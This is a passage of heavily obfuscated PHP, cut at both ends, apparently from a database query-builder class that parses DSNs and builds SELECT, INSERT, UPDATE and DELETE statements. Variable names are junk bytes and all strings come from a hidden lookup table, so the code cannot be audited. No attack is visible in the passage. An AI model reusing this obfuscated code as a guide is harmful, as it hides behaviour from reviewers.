$ãªèç³Ğ[$›ŠâÚ•ı[17]][$úğıÙ²š] : $ãªèç³Ğ[$›ŠâÚ•ı[17]][0]); return $this->connect($§ÔåªØ, $úğıÙ²š); } public function parseDSN($‡şş¦›ë) { $“ğä‡Ê‡ =& $_SERVER[É¨™èà]; if (empty($‡şş¦›ë)) { return !1; } $æ…¥¢¥ = parse_url($‡şş¦›ë); if ($æ…¥¢¥[$“ğä‡Ê‡[208]]) { $úÛÉóÄò = array($“ğä‡Ê‡[1055] => $æ…¥¢¥[$“ğä‡Ê‡[208]], $“ğä‡Ê‡[982] => isset($æ…¥¢¥[$“ğä‡Ê‡[677]]) ? $æ…¥¢¥[$“ğä‡Ê‡[677]] : $“ğä‡Ê‡[12], $“ğä‡Ê‡[983] => isset($æ…¥¢¥[$“ğä‡Ê‡[1079]]) ? $æ…¥¢¥[$“ğä‡Ê‡[1079]] : $“ğä‡Ê‡[12], $“ğä‡Ê‡[980] => isset($æ…¥¢¥[$“ğä‡Ê‡[209]]) ? $æ…¥¢¥[$“ğä‡Ê‡[209]] : $“ğä‡Ê‡[12], $“ğä‡Ê‡[981] => isset($æ…¥¢¥[$“ğä‡Ê‡[210]]) ? $æ…¥¢¥[$“ğä‡Ê‡[210]] : $“ğä‡Ê‡[12], $“ğä‡Ê‡[21] => isset($æ…¥¢¥[$“ğä‡Ê‡[87]]) ? substr($æ…¥¢¥[$“ğä‡Ê‡[87]], 1) : $“ğä‡Ê‡[12]); } else { preg_match($“ğä‡Ê‡[1080], trim($‡şş¦›ë), $ˆ‡”ê¬°); $úÛÉóÄò = array($“ğä‡Ê‡[1055] => $ˆ‡”ê¬°[1], $“ğä‡Ê‡[982] => $ˆ‡”ê¬°[2], $“ğä‡Ê‡[983] => $ˆ‡”ê¬°[3], $“ğä‡Ê‡[980] => $ˆ‡”ê¬°[4], $“ğä‡Ê‡[981] => $ˆ‡”ê¬°[5], $“ğä‡Ê‡[21] => $ˆ‡”ê¬°[6]); } $úÛÉóÄò[$“ğä‡Ê‡[1010]] = $“ğä‡Ê‡[12]; return $úÛÉóÄò; } protected function debug() { $­ª™Ã =& $_SERVER[É¨™èà]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $­ª™Ã[1081]; if (think_config($­ª™Ã[1082])) { think_status($­ª™Ã[1083]); think_trace($this->queryStr . $­ª™Ã[1084] . think_status($­ª™Ã[24], $­ª™Ã[1083], 6) . $­ª™Ã[1085], $­ª™Ã[12], $­ª™Ã[1086]); } } protected function parseLock($Û¥°ÍáÙ = false) { $šèÛĞ‡ =& $_SERVER[É¨™èà]; if (!$Û¥°ÍáÙ) { return $šèÛĞ‡[12]; } if ($šèÛĞ‡[1012] == $this->dbType) { return $šèÛĞ‡[1087]; } return $šèÛĞ‡[1088]; } protected function parseSet($ğÕ£œÍ) { $ˆĞãÜØ =& $_SERVER[É¨™èà]; foreach ($ğÕ£œÍ as $•ï¤ô€ => $“Úñ›¿) { if (is_array($“Úñ›¿) && $ˆĞãÜØ[383] == $“Úñ›¿[0]) { $‡ïÇµÙ[] = $this->parseKey($•ï¤ô€) . $ˆĞãÜØ[516] . $“Úñ›¿[1]; } elseif (is_scalar($“Úñ›¿) || is_null($“Úñ›¿)) { $‡ïÇµÙ[] = $this->parseKey($•ï¤ô€) . $ˆĞãÜØ[516] . $this->parseValue($“Úñ›¿); } } return $ˆĞãÜØ[1089] . implode($ˆĞãÜØ[50], $‡ïÇµÙ); } protected function bindParam($íŞÖ°œ, $æ§ğ’â—) { $this->bind[$_SERVER[É¨™èà][4] . $íŞÖ°œ] = $æ§ğ’â—; } protected function parseBind($‰˜¨–òŞ) { $‰˜¨–òŞ = array_merge($this->bind, $‰˜¨–òŞ); $this->bind = array(); return $‰˜¨–òŞ; } function parseKey(&$¡ï¹¡µ€, $³ßşŸ¾ = true) { if ($³ßşŸ¾) { $¡ï¹¡µ€ = $this->parseKeyCheck($¡ï¹¡µ€); } return $¡ï¹¡µ€; } function parseKeyCheck($ÔÙ€Äú‡) { $£º¢”Ó’ =& $_SERVER[É¨™èà]; $ÔÙ€Äú‡ = trim($ÔÙ€Äú‡); if (!preg_match($£º¢”Ó’[1090], $ÔÙ€Äú‡)) { think_exception($£º¢”Ó’[1091] . $ÔÙ€Äú‡); } return $ÔÙ€Äú‡; } protected function parseValue($Âñà€Ö½) { $ëú ØŠè =& $_SERVER[É¨™èà]; if (is_string($Âñà€Ö½)) { $Âñà€Ö½ = $ëú ØŠè[1051] . $this->escapeString($Âñà€Ö½) . $ëú ØŠè[1051]; } elseif (isset($Âñà€Ö½[0]) && is_string($Âñà€Ö½[0]) && strtolower($Âñà€Ö½[0]) == $ëú ØŠè[383]) { $Âñà€Ö½ = $this->escapeString($Âñà€Ö½[1]); } elseif (is_array($Âñà€Ö½)) { $Âñà€Ö½ = array_map(array($this, $ëú ØŠè[1052]), $Âñà€Ö½); } elseif (is_bool($Âñà€Ö½)) { $Âñà€Ö½ = $Âñà€Ö½ ? $ëú ØŠè[91] : $ëú ØŠè[231]; } elseif (is_null($Âñà€Ö½)) { $Âñà€Ö½ = $ëú ØŠè[106]; } return $Âñà€Ö½; } protected function parseField($¤¨‹ˆÆ) { $´”Èòùı =& $_SERVER[É¨™èà]; if (is_string($¤¨‹ˆÆ) && strpos($¤¨‹ˆÆ, $´”Èòùı[50])) { $¤¨‹ˆÆ = explode($´”Èòùı[50], $¤¨‹ˆÆ); } if (is_array($¤¨‹ˆÆ)) { $—¥¦èòº = array(); foreach ($¤¨‹ˆÆ as $Á«û•²½ => $ÊÓÖ´¯º) { if (!is_numeric($Á«û•²½)) { $—¥¦èòº[] = $this->parseKey($Á«û•²½, !1) . $´”Èòùı[1092] . $this->parseKey($ÊÓÖ´¯º); } else { $—¥¦èòº[] = $this->parseKey($ÊÓÖ´¯º); } } $È§¬ÜÙÙ = implode($´”Èòùı[50], $—¥¦èòº); } elseif (is_string($¤¨‹ˆÆ) && !empty($¤¨‹ˆÆ)) { $È§¬ÜÙÙ = $¤¨‹ˆÆ; } else { $È§¬ÜÙÙ = $´”Èòùı[223]; } return $È§¬ÜÙÙ; } protected function parseTable($‹ã…†) { $‚Ö»Ù¨ä =& $_SERVER[É¨™èà]; if (is_array($‹ã…†)) { $Œ·†”ÀŞ = array(); foreach ($‹ã…† as $ş­åáñö => $ĞŒ½¹£—) { if (!is_numeric($ş­åáñö)) { $Œ·†”ÀŞ[] = $this->parseKey($ş­åáñö) . $‚Ö»Ù¨ä[53] . $this->parseKey($ĞŒ½¹£—); } else { $Œ·†”ÀŞ[] = $this->parseKey($ş­åáñö); } } $‹ã…† = $Œ·†”ÀŞ; } elseif (is_string($‹ã…†)) { if (strstr($‹ã…†, $‚Ö»Ù¨ä[53])) { return $‹ã…†; } $‹ã…† = explode($‚Ö»Ù¨ä[50], $‹ã…†); array_walk($‹ã…†, array($this, $‚Ö»Ù¨ä[1000])); } return $‚Ö»Ù¨ä[994] . trim(implode($‚Ö»Ù¨ä[1093], $‹ã…†), $‚Ö»Ù¨ä[471]) . $‚Ö»Ù¨ä[994]; } protected function parseWhere($ê’§¶ĞÑ) { $¿Ø©ÛâÈ =& $_SERVER[É¨™èà]; $ï“å³°ª = $¿Ø©ÛâÈ[12]; if (is_string($ê’§¶ĞÑ)) { $ï“å³°ª = $ê’§¶ĞÑ; } else { $şÖÏ»Ç = isset($ê’§¶ĞÑ[$¿Ø©ÛâÈ[1094]]) ? strtoupper($ê’§¶ĞÑ[$¿Ø©ÛâÈ[1094]]) : $¿Ø©ÛâÈ[12]; if (in_array($şÖÏ»Ç, array($¿Ø©ÛâÈ[1095], $¿Ø©ÛâÈ[1096], $¿Ø©ÛâÈ[1097]))) { $şÖÏ»Ç = $¿Ø©ÛâÈ[53] . $şÖÏ»Ç . $¿Ø©ÛâÈ[53]; unset($ê’§¶ĞÑ[$¿Ø©ÛâÈ[1094]]); } else { $şÖÏ»Ç = $¿Ø©ÛâÈ[1098]; } foreach ($ê’§¶ĞÑ as $§øÇû¼º => $¶ú¢ôŸ) { $ï“å³°ª .= $¿Ø©ÛâÈ[366]; if (is_numeric($§øÇû¼º)) { $§øÇû¼º = $¿Ø©ÛâÈ[1099]; } if (0 === strpos($§øÇû¼º, $¿Ø©ÛâÈ[11])) { $ï“å³°ª .= $this->parseThinkWhere($§øÇû¼º, $¶ú¢ôŸ); } else { if (!preg_match($¿Ø©ÛâÈ[1100], trim($§øÇû¼º))) { think_exception(think_lang($¿Ø©ÛâÈ[1101]) . $¿Ø©ÛâÈ[4] . $§øÇû¼º); } $Ë”Öö”Æ = is_array($¶ú¢ôŸ) && isset($¶ú¢ôŸ[$¿Ø©ÛâÈ[1102]]); $§øÇû¼º = trim($§øÇû¼º); if (strpos($§øÇû¼º, $¿Ø©ÛâÈ[215])) { $ÅÒ¦Ÿì = explode($¿Ø©ÛâÈ[215], $§øÇû¼º); $Ïì¢Ÿûé = array(); foreach ($ÅÒ¦Ÿì as $ÛäŞº³ => $ÔŒ™â¦¯) { $Üù‡šãÕ = $Ë”Öö”Æ ? $¶ú¢ôŸ[$ÛäŞº³] : $¶ú¢ôŸ; $Ïì¢Ÿûé[] = $¿Ø©ÛâÈ[349] . $this->parseWhereItem($this->parseKey($ÔŒ™â¦¯), $Üù‡šãÕ) . $¿Ø©ÛâÈ[999]; } $ï“å³°ª .= implode($¿Ø©ÛâÈ[1103], $Ïì¢Ÿûé); } elseif (strpos($§øÇû¼º, $¿Ø©ÛâÈ[287])) { $ÅÒ¦Ÿì = explode($¿Ø©ÛâÈ[287], $§øÇû¼º); $Ïì¢Ÿûé = array(); foreach ($ÅÒ¦Ÿì as $ÛäŞº³ => $ÔŒ™â¦¯) { $Üù‡šãÕ = $Ë”Öö”Æ ? $¶ú¢ôŸ[$ÛäŞº³] : $¶ú¢ôŸ; $Ïì¢Ÿûé[] = $¿Ø©ÛâÈ[349] . $this->parseWhereItem($this->parseKey($ÔŒ™â¦¯), $Üù‡šãÕ) . $¿Ø©ÛâÈ[999]; } $ï“å³°ª .= implode($¿Ø©ÛâÈ[1098], $Ïì¢Ÿûé); } else { $ï“å³°ª .= $this->parseWhereItem($this->parseKey($§øÇû¼º), $¶ú¢ôŸ); } } $ï“å³°ª .= $¿Ø©ÛâÈ[367] . $şÖÏ»Ç; } $ï“å³°ª = substr($ï“å³°ª, 0, -strlen($şÖÏ»Ç)); } return empty($ï“å³°ª) ? $¿Ø©ÛâÈ[12] : $¿Ø©ÛâÈ[1104] . $ï“å³°ª; } protected function parseWhereItem($ë««åî®, $ êè•Œ) { $‡â§ˆ·Î =& $_SERVER[É¨™èà]; $«Úáá = $‡â§ˆ·Î[12]; if (is_array($ êè•Œ)) { if (is_string($ êè•Œ[0])) { $†ÔÇÙ¶ğ = strtolower($ êè•Œ[0]); if (in_array($ êè•Œ[0], array($‡â§ˆ·Î[516], $‡â§ˆ·Î[1105], $‡â§ˆ·Î[1106], $‡â§ˆ·Î[1107], $‡â§ˆ·Î[1108], $‡â§ˆ·Î[1109]))) { $«Úáá .= $ë««åî® . $‡â§ˆ·Î[53] . $ êè•Œ[0] . $‡â§ˆ·Î[53] . $this->parseValue($ êè•Œ[1]); } elseif (preg_match($‡â§ˆ·Î[1110], $ êè•Œ[0])) { $«Úáá .= $ë««åî® . $‡â§ˆ·Î[53] . $this->exp[$†ÔÇÙ¶ğ] . $‡â§ˆ·Î[53] . $this->parseValue($ êè•Œ[1]); } elseif (preg_match($‡â§ˆ·Î[1111], $ êè•Œ[0])) { if (is_array($ êè•Œ[1])) { $äêÒˆŸò = isset($ êè•Œ[2]) ? strtoupper($ êè•Œ[2]) : $‡â§ˆ·Î[1096]; if (in_array($äêÒˆŸò, array($‡â§ˆ·Î[1095], $‡â§ˆ·Î[1096], $‡â§ˆ·Î[1097]))) { $îöóÚş = array(); foreach ($ êè•Œ[1] as $•ª¶ì÷œ) { $îöóÚş[] = $ë««åî® . $‡â§ˆ·Î[53] . $this->exp[$†ÔÇÙ¶ğ] . $‡â§ˆ·Î[53] . $this->parseValue($•ª¶ì÷œ); } $«Úáá .= $‡â§ˆ·Î[349] . implode($‡â§ˆ·Î[53] . $äêÒˆŸò . $‡â§ˆ·Î[53], $îöóÚş) . $‡â§ˆ·Î[999]; } } else { $«Úáá .= $ë««åî® . $‡â§ˆ·Î[53] . $this->exp[$†ÔÇÙ¶ğ] . $‡â§ˆ·Î[53] . $this->parseValue($ êè•Œ[1]); } } elseif ($‡â§ˆ·Î[383] == $†ÔÇÙ¶ğ) { $«Úáá .= $‡â§ˆ·Î[997] . $ë««åî® . $‡â§ˆ·Î[53] . $ êè•Œ[1] . $‡â§ˆ·Î[1112]; } elseif (preg_match($‡â§ˆ·Î[1113], $ êè•Œ[0])) { $«Úáá .= $ êè•Œ[0]; } elseif (preg_match($‡â§ˆ·Î[1114], $ êè•Œ[0])) { if (isset($ êè•Œ[2]) && $‡â§ˆ·Î[383] == $ êè•Œ[2]) { $«Úáá .= $ë««åî® . $‡â§ˆ·Î[53] . $this->exp[$†ÔÇÙ¶ğ] . $‡â§ˆ·Î[53] . $ êè•Œ[1]; } else { if (is_string($ êè•Œ[1])) { $ êè•Œ[1] = explode($‡â§ˆ·Î[50], $ êè•Œ[1]); } $ıƒ•††ë = implode($‡â§ˆ·Î[50], $this->parseValue($ êè•Œ[1])); $«Úáá .= $ë««åî® . $‡â§ˆ·Î[53] . $this->exp[$†ÔÇÙ¶ğ] . $‡â§ˆ·Î[997] . $ıƒ•††ë . $‡â§ˆ·Î[999]; } } elseif (preg_match($‡â§ˆ·Î[1115], $ êè•Œ[0])) { $±àõî–³ = is_string($ êè•Œ[1]) ? explode($‡â§ˆ·Î[50], $ êè•Œ[1]) : $ êè•Œ[1]; $«Úáá .= $‡â§ˆ·Î[997] . $ë««åî® . $‡â§ˆ·Î[53] . $this->exp[$†ÔÇÙ¶ğ] . $‡â§ˆ·Î[53] . $this->parseValue($±àõî–³[0]) . $‡â§ˆ·Î[1098] . $this->parseValue($±àõî–³[1]) . $‡â§ˆ·Î[367]; } else { think_exception(think_lang($‡â§ˆ·Î[1101]) . $‡â§ˆ·Î[4] . $ êè•Œ[0]); } } else { $àÖüÆÈ• = count($ êè•Œ); $Üú®¸¹È = $‡â§ˆ·Î[12]; if (is_string($ êè•Œ[$àÖüÆÈ• - 1])) { $Üú®¸¹È = isset($ êè•Œ[$àÖüÆÈ• - 1]) ? strtoupper($ êè•Œ[$àÖüÆÈ• - 1]) : $‡â§ˆ·Î[12]; if (in_array($Üú®¸¹È, array($‡â§ˆ·Î[1095], $‡â§ˆ·Î[1096], $‡â§ˆ·Î[1097]))) { $àÖüÆÈ• = $àÖüÆÈ• - 1; } } else { $Üú®¸¹È = $‡â§ˆ·Î[1095]; } for ($ŞÓ½¢ûÛ = 0; $ŞÓ½¢ûÛ < $àÖüÆÈ•; $ŞÓ½¢ûÛ++) { $±àõî–³ = is_array($ êè•Œ[$ŞÓ½¢ûÛ]) ? $ êè•Œ[$ŞÓ½¢ûÛ][1] : $ êè•Œ[$ŞÓ½¢ûÛ]; if ($‡â§ˆ·Î[383] == strtolower($ êè•Œ[$ŞÓ½¢ûÛ][0])) { $«Úáá .= $‡â§ˆ·Î[349] . $ë««åî® . $‡â§ˆ·Î[53] . $±àõî–³ . $‡â§ˆ·Î[1112] . $Üú®¸¹È . $‡â§ˆ·Î[53]; } else { $ïæŞ¼† = is_array($ êè•Œ[$ŞÓ½¢ûÛ]) ? $this->exp[strtolower($ êè•Œ[$ŞÓ½¢ûÛ][0])] : $‡â§ˆ·Î[516]; if (!$ïæŞ¼† && is_array($ êè•Œ[$ŞÓ½¢ûÛ]) && in_array($ êè•Œ[$ŞÓ½¢ûÛ][0], array($‡â§ˆ·Î[516], $‡â§ˆ·Î[1105], $‡â§ˆ·Î[1106], $‡â§ˆ·Î[1107], $‡â§ˆ·Î[1108], $‡â§ˆ·Î[1109]))) { $ïæŞ¼† = $ êè•Œ[$ŞÓ½¢ûÛ][0]; } $«Úáá .= $‡â§ˆ·Î[349] . $ë««åî® . $‡â§ˆ·Î[53] . $ïæŞ¼† . $‡â§ˆ·Î[53] . $this->parseValue($±àõî–³) . $‡â§ˆ·Î[1112] . $Üú®¸¹È . $‡â§ˆ·Î[53]; } } $«Úáá = substr($«Úáá, 0, -4); } } else { $«Úáá .= $ë««åî® . $‡â§ˆ·Î[1116] . $this->parseValue($ êè•Œ); } return $«Úáá; } protected function parseThinkWhere($‚Ôì¾ÉÌ, $Ğ±Õ ±„) { $ŸòşÏçâ =& $_SERVER[É¨™èà]; $€‰¡ÄÃÎ = $ŸòşÏçâ[12]; switch ($‚Ôì¾ÉÌ) { case $ŸòşÏçâ[438]: $€‰¡ÄÃÎ = $Ğ±Õ ±„; break; case $ŸòşÏçâ[1099]: $€‰¡ÄÃÎ = is_string($Ğ±Õ ±„) ? $Ğ±Õ ±„ : substr($this->parseWhere($Ğ±Õ ±„), 6); break; case $ŸòşÏçâ[1117]: parse_str($Ğ±Õ ±„, $ã‹œÛíÖ); if (isset($ã‹œÛíÖ[$ŸòşÏçâ[1094]])) { $’‹‚ÙÇ = $ŸòşÏçâ[53] . strtoupper($ã‹œÛíÖ[$ŸòşÏçâ[1094]]) . $ŸòşÏçâ[53]; unset($ã‹œÛíÖ[$ŸòşÏçâ[1094]]); } else { $’‹‚ÙÇ = $ŸòşÏçâ[1098]; } $™‰´ö™Ÿ = array(); foreach ($ã‹œÛíÖ as $š¼­”Ö => $·¨­ıø) { $™‰´ö™Ÿ[] = $this->parseKey($š¼­”Ö) . $ŸòşÏçâ[1116] . $this->parseValue($·¨­ıø); } $€‰¡ÄÃÎ = implode($’‹‚ÙÇ, $™‰´ö™Ÿ); break; } return $€‰¡ÄÃÎ; } protected function parseLimit($¶ôº´¦é) { $½Ö‰å— =& $_SERVER[É¨™èà]; return !empty($¶ôº´¦é) ? $½Ö‰å—[51] . $¶ôº´¦é . $½Ö‰å—[53] : $½Ö‰å—[12]; } protected function parseJoin($Ûïƒš´) { $úÄ¼„‰© =& $_SERVER[É¨™èà]; $”ÜÄ§¤ = $úÄ¼„‰©[12]; if (!empty($Ûïƒš´)) { if (is_array($Ûïƒš´)) { foreach ($Ûïƒš´ as $Åá³±¨¾ => $ß¿¤©¥ã) { if (!1 !== stripos($ß¿¤©¥ã, $úÄ¼„‰©[1118])) { $”ÜÄ§¤ .= $úÄ¼„‰©[53] . $ß¿¤©¥ã; } else { $”ÜÄ§¤ .= $úÄ¼„‰©[1119] . $ß¿¤©¥ã; } } } else { $”ÜÄ§¤ .= $úÄ¼„‰©[1119] . $Ûïƒš´; } } $”ÜÄ§¤ = preg_replace($úÄ¼„‰©[1120], think_config($úÄ¼„‰©[1024]) . $úÄ¼„‰©[1121], $”ÜÄ§¤); return $”ÜÄ§¤; } protected function parseOrder($§”ˆòí‰) { $äığóÛŸ =& $_SERVER[É¨™èà]; if (is_array($§”ˆòí‰)) { $ÍŸ¤®Öº = array(); foreach ($§”ˆòí‰ as $ĞÄ››ä => $ïŒºì×) { if (is_numeric($ĞÄ››ä)) { $ÍŸ¤®Öº[] = $this->parseKey($ïŒºì×); } else { $ïŒºì× = in_array(strtoupper(trim($ïŒºì×)), array($äığóÛŸ[1122], $äığóÛŸ[1123])) ? $äığóÛŸ[53] . $ïŒºì× : $äığóÛŸ[12]; if (preg_match($äığóÛŸ[1124], $ĞÄ››ä)) { $ÍŸ¤®Öº[] = $this->parseKey($ĞÄ››ä) . $ïŒºì×; } else { think_exception($äığóÛŸ[1125] . $ĞÄ››ä); } } } $§”ˆòí‰ = implode($äığóÛŸ[50], $ÍŸ¤®Öº); } return !empty($§”ˆòí‰) ? $äığóÛŸ[1126] . $§”ˆòí‰ : $äığóÛŸ[12]; } protected function parseGroup($êà ¶êã) { $À£ß°¥Î =& $_SERVER[É¨™èà]; return !empty($êà ¶êã) ? $À£ß°¥Î[1127] . $êà ¶êã : $À£ß°¥Î[12]; } protected function parseHaving($¾¿ıêà”) { $ğäã¾õ¤ =& $_SERVER[É¨™èà]; return !empty($¾¿ıêà”) ? $ğäã¾õ¤[1128] . $¾¿ıêà” : $ğäã¾õ¤[12]; } protected function parseComment($ÑÍ·­Âñ) { $ƒ áã¦Ø =& $_SERVER[É¨™èà]; return !empty($ÑÍ·­Âñ) ? $ƒ áã¦Ø[1129] . $ÑÍ·­Âñ . $ƒ áã¦Ø[1130] : $ƒ áã¦Ø[12]; } protected function parseDistinct($¡â˜ŸÒ) { $”úƒƒ§ =& $_SERVER[É¨™èà]; return !empty($¡â˜ŸÒ) ? $”úƒƒ§[1131] : $”úƒƒ§[12]; } protected function parseUnion($çáäãñ–) { $ûºÜµÅâ =& $_SERVER[É¨™èà]; if (empty($çáäãñ–)) { return $ûºÜµÅâ[12]; } if (isset($çáäãñ–[$ûºÜµÅâ[434]])) { $üıâÁ…‹ = $ûºÜµÅâ[1132]; unset($çáäãñ–[$ûºÜµÅâ[434]]); } else { $üıâÁ…‹ = $ûºÜµÅâ[1133]; } foreach ($çáäãñ– as $‰Æß€ä¦) { $Üé¼ášé[] = $üıâÁ…‹ . (is_array($‰Æß€ä¦) ? $this->buildSelectSql($‰Æß€ä¦) : $‰Æß€ä¦); } return implode($ûºÜµÅâ[53], $Üé¼ášé); } public function insert($âİÈŒÈ¾, $†úéÓã¢ = array(), $üÇ®şÆ• = false) { $¼Å¸ô—Ô =& $_SERVER[É¨™èà]; $¾©âû = $•äö‰¼ = array(); $this->model = $†úéÓã¢[$¼Å¸ô—Ô[370]]; foreach ($âİÈŒÈ¾ as $õ„£“Á => $·Î–üŠŠ) { if (is_array($·Î–üŠŠ) && $¼Å¸ô—Ô[383] == $·Î–üŠŠ[0]) { $•äö‰¼[] = $this->parseKey($õ„£“Á); $¾©âû[] = $·Î–üŠŠ[1]; } elseif (is_scalar($·Î–üŠŠ) || is_null($·Î–üŠŠ)) { $•äö‰¼[] = $this->parseKey($õ„£“Á); $¾©âû[] = $this->parseValue($·Î–üŠŠ); } } $µƒÃĞûˆ = ($üÇ®şÆ• ? $¼Å¸ô—Ô[1001] : $¼Å¸ô—Ô[1002]) . $¼Å¸ô—Ô[1003] . $this->parseTable($†úéÓã¢[$¼Å¸ô—Ô[368]]) . $¼Å¸ô—Ô[997] . implode($¼Å¸ô—Ô[50], $•äö‰¼) . $¼Å¸ô—Ô[998] . implode($¼Å¸ô—Ô[50], $¾©âû) . $¼Å¸ô—Ô[999]; $µƒÃĞûˆ .= $this->parseLock(isset($†úéÓã¢[$¼Å¸ô—Ô[940]]) ? $†úéÓã¢[$¼Å¸ô—Ô[940]] : !1); $µƒÃĞûˆ .= $this->parseComment(!empty($†úéÓã¢[$¼Å¸ô—Ô[440]]) ? $†úéÓã¢[$¼Å¸ô—Ô[440]] : $¼Å¸ô—Ô[12]); return $this->execute($µƒÃĞûˆ, $this->parseBind(!empty($†úéÓã¢[$¼Å¸ô—Ô[372]]) ? $†úéÓã¢[$¼Å¸ô—Ô[372]] : array())); } public function selectInsert($¨ºÎ¤Ç±, $¸àø»ÕÏ, $¾ºâÏ ™ = array()) { $©ï˜ÙıÎ =& $_SERVER[É¨™èà]; $this->model = $¾ºâÏ ™[$©ï˜ÙıÎ[370]]; if (is_string($¨ºÎ¤Ç±)) { $¨ºÎ¤Ç± = explode($©ï˜ÙıÎ[50], $¨ºÎ¤Ç±); } array_walk($¨ºÎ¤Ç±, array($this, $©ï˜ÙıÎ[1000])); $¦÷«Ô¥ = $©ï˜ÙıÎ[1134] . $this->parseTable($¸àø»ÕÏ) . $©ï˜ÙıÎ[997] . implode($©ï˜ÙıÎ[50], $¨ºÎ¤Ç±) . $©ï˜ÙıÎ[1112]; $¦÷«Ô¥ .= $this->buildSelectSql($¾ºâÏ ™); return $this->execute($¦÷«Ô¥, $this->parseBind(!empty($¾ºâÏ ™[$©ï˜ÙıÎ[372]]) ? $¾ºâÏ ™[$©ï˜ÙıÎ[372]] : array())); } public function update($ë¡¹æ ¨, $ÜŠéïÅí) { $‚ü˜‘ =& $_SERVER[É¨™èà]; $this->model = $ÜŠéïÅí[$‚ü˜‘[370]]; $ÛßÊø¥À = $‚ü˜‘[1135] . $this->parseTable($ÜŠéïÅí[$‚ü˜‘[368]]) . $this->parseSet($ë¡¹æ ¨) . $this->parseWhere(!empty($ÜŠéïÅí[$‚ü˜‘[364]]) ? $ÜŠéïÅí[$‚ü˜‘[364]] : $‚ü˜‘[12]) . $this->parseOrder(!empty($ÜŠéïÅí[$‚ü˜‘[452]]) ? $ÜŠéïÅí[$‚ü˜‘[452]] : $‚ü˜‘[12]) . $this->parseLimit(!empty($ÜŠéïÅí[$‚ü˜‘[379]]) ? $ÜŠéïÅí[$‚ü˜‘[379]] : $‚ü˜‘[12]) . $this->parseLock(isset($ÜŠéïÅí[$‚ü˜‘[940]]) ? $ÜŠéïÅí[$‚ü˜‘[940]] : !1) . $this->parseComment(!empty($ÜŠéïÅí[$‚ü˜‘[440]]) ? $ÜŠéïÅí[$‚ü˜‘[440]] : $‚ü˜‘[12]); return $this->execute($ÛßÊø¥À, $this->parseBind(!empty($ÜŠéïÅí[$‚ü˜‘[372]]) ? $ÜŠéïÅí[$‚ü˜‘[372]] : array())); } public function delete($ÇÌ“š¸ª = array()) { $ĞïìêÄ“ =& $_SERVER[É¨™èà]; $this->model = $ÇÌ“š¸ª[$ĞïìêÄ“[370]]; $ÅÏ®„âş = $ĞïìêÄ“[1136] . $this->parseTable($ÇÌ“š¸ª[$ĞïìêÄ“[368]]) . $this->parseWhere(!empty($ÇÌ“š¸ª[$ĞïìêÄ“[364]]) ? $ÇÌ“š¸ª[$ĞïìêÄ“[364]] : $ĞïìêÄ“[12]) . $this->parseOrder(!empty($ÇÌ“š¸ª[$ĞïìêÄ“[452]]) ? $ÇÌ“š¸ª[$ĞïìêÄ“[452]] : $ĞïìêÄ“[12]) . $this->parseLimit(!empty($ÇÌ“š¸ª[$ĞïìêÄ“[379]]) ? $ÇÌ“š¸ª[$ĞïìêÄ“[379]] : $ĞïìêÄ“[12]) . $this->parseLock(isset($ÇÌ“š¸ª[$ĞïìêÄ“[940]]) ? $ÇÌ“š¸ª[$ĞïìêÄ“[940]] : !1) . $this->parseComment(!empty($ÇÌ“š¸ª[$ĞïìêÄ“[440]]) ? $ÇÌ“š¸ª[$ĞïìêÄ“[440]] : $ĞïìêÄ“[12]); return $this->execute($ÅÏ®„âş, $this->parseBind(!empty($ÇÌ“š¸ª[$ĞïìêÄ“[372]]) ? $ÇÌ“š¸ª[$ĞïìêÄ“[372]] : array())); } public function select($ììãÔÇÙ = array()) { $ä½Ó”› =& $_SERVER[É¨™èà]; $this->model = $ììãÔÇÙ[$ä½Ó”›[370]]; $œ“¦ÌÈ  = $this->buildSelectSql($ììãÔÇÙ); $æ¡ÂıÈ = isset($ììãÔÇÙ[$ä½Ó”›[435]]) ? $ììãÔÇÙ[$ä½Ó”›[435]] : !1; if ($æ¡ÂıÈ) { $“õœãò… = is_string($æ¡ÂıÈ[$ä½Ó”›[97]]) ? $æ¡ÂıÈ[$ä½Ó”›[97]] : $ä½Ó”›[1137] . md5($œ“¦ÌÈ ); $ßÇğĞÍô = think_cache($“õœãò…, $ä½Ó”›[12], $æ¡ÂıÈ); if (!1 !== $ßÇğĞÍô) { return $ßÇğĞÍô; } } $ÑŸÖ¦Ã— = $this->query($œ“¦ÌÈ , $this->parseBind(!empty($ììãÔÇÙ[$ä½Ó”›[372]]) ? $ììãÔÇÙ[$ä½Ó”›[372]] : array())); if ($æ¡ÂıÈ && !1 !== $ÑŸÖ¦Ã—) { think_cache($“õœãò…, $ÑŸÖ¦Ã—, $æ¡ÂıÈ); } return $ÑŸÖ¦Ã—; } public function buildSelectSql($ŒŒ–ëØÓ = array()) { $š¯÷¢ÁĞ =& $_SERVER[É¨™èà]; if (isset($ŒŒ–ëØÓ[$š¯÷¢ÁĞ[439]])) { if (strpos($ŒŒ–ëØÓ[$š¯÷¢ÁĞ[439]], $š¯÷¢ÁĞ[50])) { list($¾¨÷·ô‚, $Š¤ùúÆŠ) = explode($š¯÷¢ÁĞ[50], $ŒŒ–ëØÓ[$š¯÷¢ÁĞ[439]]); } else { $¾¨÷·ô‚ = $ŒŒ–ëØÓ[$š¯÷¢ÁĞ[439]]; } $¾¨÷·ô‚ = $¾¨÷·ô‚ ? $¾¨÷·ô‚ : 1; $Š¤ùúÆŠ = isset($Š¤ùúÆŠ) ? $Š¤ùúÆŠ : (is_numeric($ŒŒ–ëØÓ[$š¯÷¢ÁĞ[379]]) ? $ŒŒ–ëØÓ[$š¯÷¢ÁĞ[379]] : 20); $àç£îÂÌ = $Š¤ùúÆŠ * ((int) $¾¨÷·ô‚ - 1); $ŒŒ–ëØÓ[$š¯÷¢ÁĞ[379]] = $àç£îÂÌ . $š¯÷¢ÁĞ[50] . $Š¤ùúÆŠ; } if (think_config($š¯÷¢ÁĞ[1138])) { $Ã‰íÏ² = $š¯÷¢ÁĞ[1139] . md5(serialize($ŒŒ–ëØÓ)); $ÄØƒÒó = think_cache($Ã‰íÏ²); if ($ÄØƒÒó) { return $ÄØƒÒó; } } $¬®ÂÕĞú = $this->parseSql($this->selectSql, $ŒŒ–ëØÓ); $¬®ÂÕĞú .= $this->parseLock(isset($ŒŒ–ëØÓ[$š¯÷¢ÁĞ[940]]) ? $ŒŒ–ëØÓ[$š¯÷¢ÁĞ[940]] : !1); if (isset($Ã‰íÏ²)) { think_cache($Ã‰íÏ², $¬®ÂÕĞú); } return $¬®ÂÕĞú; } public function parseSql($×ÒÛ½üÒ, $¬æĞ¨½ = array()) { $à¯Ã²õ¾ =& $_SERVER[É¨™èà]; $×ÒÛ½üÒ = 